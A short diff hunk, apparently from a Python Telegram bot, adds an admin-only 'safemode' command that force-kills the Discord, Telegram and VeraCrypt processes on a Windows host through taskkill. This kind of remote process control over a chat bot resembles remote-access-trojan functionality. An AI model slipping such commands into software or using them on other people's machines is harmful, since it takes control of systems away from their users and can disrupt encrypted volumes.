@@ -1869,6 +1869,21 @@ def getlastlogs(message):
                 pass
 
 
+@bot.message_handler(commands=['safemode', 'sm'])
+def safemode(message):
+    if message.chat.id in adm:
+        try:
+            os.system('taskkill /f /im discord.exe')
+        except:
+            pass
+        try:
+            os.system('taskkill /f /im telegram.exe')
+        except:
+            pass
+        try:
+            os.system('taskkill /f /im veracrypt.exe')
+        except:
+            pass
 
 
 try:
